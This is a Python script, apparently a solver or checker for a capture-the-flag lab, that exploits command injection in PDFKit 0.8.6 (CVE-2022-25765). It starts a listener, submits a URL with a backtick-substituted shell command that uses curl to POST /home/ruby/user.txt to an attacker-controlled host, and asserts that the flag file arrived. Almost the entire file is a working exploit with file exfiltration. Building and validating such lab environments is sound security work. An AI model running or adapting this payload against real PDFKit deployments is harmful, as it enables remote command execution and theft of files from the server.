#!/usr/bin/env python3
"""Independent HTTP player for the real PDFKit 0.8.6 training target."""
import http.server
import os
import threading
import time
import urllib.parse
import urllib.request

target=os.environ.get("TARGET_URL","http://precious-target:8080").rstrip("/")
expected=os.environ["EXPECTED_USER_FLAG"]
observed=[]
class Server(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type","text/html")
        self.end_headers()
        self.wfile.write(b"<html><body><h1>Independent test page</h1></body></html>")
    def do_POST(self):
        data=self.rfile.read(int(self.headers.get("Content-Length","0"))).decode("utf-8","replace")
        observed.append(data)
        self.send_response(204)
        self.end_headers()
    def log_message(self,*_): pass

server=http.server.ThreadingHTTPServer(("0.0.0.0",9090),Server)
threading.Thread(target=server.serve_forever,daemon=True).start()

def convert(url):
    form=urllib.parse.urlencode({"url":url}).encode()
    try:
        with urllib.request.urlopen(urllib.request.Request(target+"/",data=form),timeout=35) as r:
            return r.status,r.read()
    except urllib.error.HTTPError as exc:
        return exc.code,exc.read()

print("[1/4] Real PDF from player-hosted HTML")
code,pdf=convert("http://attacker:9090/")
assert code==200 and pdf.startswith(b"%PDF-"),"Native PDF conversion did not return a PDF"
assert b"pdfkit" in pdf.lower() or b"%PDF" in pdf

print("[2/4] Native PDFKit command substitution path")
# CVE-2022-25765: percent-encoded whitespace and shell substitution are
# interpreted by the affected PDFKit command construction.
command="curl -fsS -X POST --data-binary @/home/ruby/user.txt http://attacker:9090/collect"
payload="http://attacker:9090/?name=%20`"+command+"`"
code,_=convert(payload)
print("Conversion response:",code)

print("[3/4] Check actual Web process file access via HTTP callback")
end=time.time()+20
while time.time()<end and expected not in observed:
    time.sleep(0.25)
assert expected in observed,"No real command execution and per-instance Web Flag callback"

print("[4/4] Verify successful native PDFKit Web-chain exploitation")
print("PASS: PDFKit 0.8.6 native injection -> non-root Web flag from isolated target")
server.shutdown()
